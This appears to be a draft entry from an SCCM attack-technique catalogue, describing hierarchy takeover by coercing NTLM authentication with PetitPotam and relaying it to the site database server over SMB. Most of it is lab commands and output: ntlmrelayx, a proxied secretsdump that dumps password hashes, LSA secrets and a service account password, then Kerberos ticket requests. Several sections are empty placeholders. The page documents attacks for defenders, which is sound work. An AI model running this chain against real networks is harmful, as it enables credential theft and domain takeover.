# TAKEOVER-2

## Description
Hierarchy takeover via NTLM coercion and relay to SMB on remote site database

## MITRE ATT&CK TTPs
- [TA0004](https://attack.mitre.org/tactics/TA0004) - Privilege Escalation
- [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement

## Requirements
-
-

## Summary

## Impact

## Subtechniques
- TAKEOVER-2.1: Coerce primary site server
- TAKEOVER-2.2: Coerce passive site server

## Defensive IDs
- [PREVENT-1: Patch SCCM Site Server with KB15599094](../defense-techniques/PREVENT/PREVENT-1/prevent-1_description.md)

## Examples
The steps to execute TAKEOVER-2.1 and TAKEOVER-2.2 are mostly the same except that a different system is targeted for coercion of NTLM authentication.

1. On the attacker relay server, start `ntlmrelayx`, targeting the IP address of the site database server:


### Windows
1. 


### Linux
1. Start `ntlmrelayx` with a SOCKS proxy
```
# impacket-ntlmrelayx -smb2support -ts -ip 192.168.57.130 -t 192.168.57.31 -socks
Impacket v0.11.0 - Copyright 2023 Fortra

[2024-03-01 12:51:57] [*] Protocol Client MSSQL loaded..
[2024-03-01 12:51:57] [*] Protocol Client LDAPS loaded..
[2024-03-01 12:51:57] [*] Protocol Client LDAP loaded..
[2024-03-01 12:51:57] [*] Protocol Client RPC loaded..
[2024-03-01 12:51:57] [*] Protocol Client HTTP loaded..
[2024-03-01 12:51:57] [*] Protocol Client HTTPS loaded..
[2024-03-01 12:51:57] [*] Protocol Client IMAPS loaded..
[2024-03-01 12:51:57] [*] Protocol Client IMAP loaded..
[2024-03-01 12:51:57] [*] Protocol Client SMTP loaded..
[2024-03-01 12:51:57] [*] Protocol Client SMB loaded..
[2024-03-01 12:51:57] [*] Protocol Client DCSYNC loaded..
[2024-03-01 12:51:58] [*] Running in relay mode to single host
[2024-03-01 12:51:58] [*] SOCKS proxy started. Listening at port 1080
[2024-03-01 12:51:58] [*] HTTPS Socks Plugin loaded..
[2024-03-01 12:51:58] [*] HTTP Socks Plugin loaded..
[2024-03-01 12:51:58] [*] MSSQL Socks Plugin loaded..
[2024-03-01 12:51:58] [*] IMAP Socks Plugin loaded..
[2024-03-01 12:51:58] [*] SMB Socks Plugin loaded..
[2024-03-01 12:51:58] [*] SMTP Socks Plugin loaded..
[2024-03-01 12:51:58] [*] IMAPS Socks Plugin loaded..
[2024-03-01 12:51:58] [*] Setting up SMB Server
[2024-03-01 12:51:58] [*] Setting up HTTP Server on port 80
[2024-03-01 12:51:58] [*] Setting up WCF Server
[2024-03-01 12:51:58] [*] Setting up RAW Server on port 6666
```

2. Coerce auth

```
# python3 PetitPotam.py -d MAYYHEM.LOCAL -u lowpriv -p P@ssw0rd 192.168.57.130 192.168.57.50 

Trying pipe lsarpc
[-] Connecting to ncacn_np:192.168.57.50[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

3. Receive connection on relay server

```
[2024-03-01 12:53:19] [*] SMBD-Thread-11 (process_request_thread): Received connection from 192.168.57.50, attacking target smb://192.168.57.31
[2024-03-01 12:53:19] [*] Authenticating against smb://192.168.57.31 as MAYYHEM/SITE-SERVER$ SUCCEED
[2024-03-01 12:53:19] [*] SOCKS: Adding MAYYHEM/SITE-SERVER$@192.168.57.31(445) to active SOCKS connection. Enjoy
[2024-03-01 12:53:19] [*] SMBD-Thread-12 (process_request_thread): Connection from 192.168.57.50 controlled, but there are no more targets left!
[2024-03-01 12:53:19] [*] SMBD-Thread-13 (process_request_thread): Connection from 192.168.57.50 controlled, but there are no more targets left!
[2024-03-01 12:53:19] [*] SMBD-Thread-14 (process_request_thread): Connection from 192.168.57.50 controlled, but there are no more targets left!
[2024-03-01 12:53:19] [*] SMBD-Thread-15 (process_request_thread): Connection from 192.168.57.50 controlled, but there are no more targets left!

ntlmrelayx> socks
Protocol  Target         Username              AdminStatus  Port 
--------  -------------  --------------------  -----------  ----
SMB       192.168.57.31  MAYYHEM/SITE-SERVER$  TRUE         445 
```

4. Proxy in secretsdump

```
# proxychains impacket-secretsdump MAYYHEM/SITE-SERVER\$@192.168.57.31
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.57.31:445  ...  OK
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xc572147b3e06ec7f803013a6a063b524
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:2b073c86868014e813942f6a91c031bd:::
[*] Dumping cached domain logon information (domain/username:hash)
MAYYHEM.LOCAL/sccmadmin:$DCC2$10240#sccmadmin#9c5f6da0aea59713bb5f5dc02c638b48: (2024-02-29 18:49:56)
MAYYHEM.LOCAL/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-02-24 18:21:18)
MAYYHEM.LOCAL/sqlsvc:$DCC2$10240#sqlsvc#e12866f9a8777ddbe39ae1380ac6346c: (2024-03-01 17:23:29)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
MAYYHEM\SITE3-DB$:aes256-cts-hmac-sha1-96:007976468ea0315075ce15a87f4c53d84fb3ad113076f362ec9dc0f79281ba03
MAYYHEM\SITE3-DB$:aes128-cts-hmac-sha1-96:2d8e3cd4527e138dc7b575e411bb3068
MAYYHEM\SITE3-DB$:des-cbc-md5:83f1c8c46ead7ca4
MAYYHEM\SITE3-DB$:plain_password_hex:6100690040005a0044005100330033006e0059005a006a002c00530057006f002b0070005d00410020002500470052005100720045006d00630037006d00610066002600590074003e0058006d00780058005100740073003a0043002b0070003a004b0079006f0046004b0036004100330072007a002c0041003600320023002900550068002900630058007a004a006e002d0070004c005e006c0066004f003c006000470048005a00320068002b005a0061007800670040004700750040003500250061006f004600240028004400780025002e00730048005c003f0024006a003000710074004f0071007a006d00
MAYYHEM\SITE3-DB$:aad3b435b51404eeaad3b435b51404ee:1eca4d3eef64b6aaf28ed0a528afbaf0:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xf4704cc00adfc198ca52f755a535d43c42054a44
dpapi_userkey:0x09f0ba58ff1d4b67d7d24bf126ff33e682b57fcf
[*] NL$KM 
 0000   29 78 85 64 E8 D8 57 5E  62 0F 15 6D 78 D3 C3 BD   )x.d..W^b..mx...
 0010   D1 11 71 D7 E1 D6 75 B5  F3 90 9B AD 3E C7 07 6E   ..q...u.....>..n
 0020   C4 EE 9C DC 2E 43 E7 C3  9A 2E 98 5B A3 7B 8E E1   .....C.....[.{..
 0030   72 8F 2B A0 4A 4D BE D0  AB CB 42 A7 61 E5 B0 C1   r.+.JM....B.a...
NL$KM:29788564e8d8575e620f156d78d3c3bdd11171d7e1d675b5f3909bad3ec7076ec4ee9cdc2e43e7c39a2e985ba37b8ee1728f2ba04a4dbed0abcb42a761e5b0c1
[*] _SC_MSSQLSERVER 
MAYYHEM\sqlsvc:P@ssw0rd
[*] _SC_SQLSERVERAGENT 
MAYYHEM\sqlsvc:P@ssw0rd
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

5. Get TGT for SQL service account running the site database

```
# impacket-getTGT MAYYHEM/sqlsvc:P@ssw0rd                                  
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Saving ticket in sqlsvc.ccache

```

6. S4U

```
# python3 gets4uticket.py kerberos+ccache://mayyhem.local\\sqlsvc:sqlsvc.ccache@dc.mayyhem.local MSSQLSvc/SITE3-DB.MAYYHEM.LOCAL:1433@mayyhem.local site-server@mayyhem.local s4u.ccache -v
```



## References
Author, Title, URL